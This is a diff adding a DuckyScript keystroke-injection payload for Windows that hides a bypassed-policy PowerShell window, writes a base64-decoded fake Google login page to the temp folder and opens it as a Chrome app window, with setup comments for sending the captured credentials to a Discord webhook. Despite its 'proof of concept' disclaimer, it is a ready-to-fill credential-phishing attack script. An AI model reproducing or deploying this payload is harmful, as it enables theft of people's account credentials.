@@ -1,0 +1,35 @@
+REM Title: Fake Google Login to Discord
+REM Author: @beigeworm
+REM Description: Uses Powershell to open a webview window with a phishing page that sends the results to a discord webhook.
+REM Target: Windows 10
+
+REM **YOU WILL NEED THIS HTML FILE TO EDIT AND CONVERT** (https://github.com/beigeworm/assets/blob/main/login.html)
+REM Please don't be a bum hole and use this to pwn people, it is meant as a proof of concept only.
+
+REM *SETUP*
+REM replace WEBHOOK_HERE with a webhook and encode all the html to base 64. (HTML CODE LINK ABOVE)
+REM then replace YOUR_BASE64_ENCODED_HTML_HERE with the base64 string.
+REM Base65 encoder - https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Base64-Encoder-Decoder-GUI.ps1
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove -W Hidden to show the window).
+GUI r
+DELAY 750
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+CTRL-SHIFT ENTER
+DELAY 1500
+ALT y
+DELAY 5000
+
+STRING $encodedText = 'YOUR_BASE64_ENCODED_HTML_HERE'
+ENTER
+STRING $decodedBytes = [System.Convert]::FromBase64String($encodedText);$decodedText = [System.Text.Encoding]::UTF8.GetString($decodedBytes);$outputFile = "$env:temp\google.html";Set-Content -Path $outputFile -Value $decodedText -Encoding UTF8
+ENTER
+STRING$htmlFile = "$env:temp\google.html";$screen = [System.Windows.Forms.Screen]::PrimaryScreen;$screenWidth = $screen.WorkingArea.Width;$screenHeight = $screen.WorkingArea.Height;$left = ($screenWidth - $width) / 2;$top = ($screenHeight - $height) / 2;$chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe";$width = 530;$height = 600
+ENTER
+STRING $arguments = "--new-window --window-position=$left,$top --window-size=$width,$height --app=$htmlFile";$chromeProcess = Start-Process -FilePath $chromePath -ArgumentList $arguments -PassThru;$chromeProcess.WaitForExit()
+ENTER
+
+
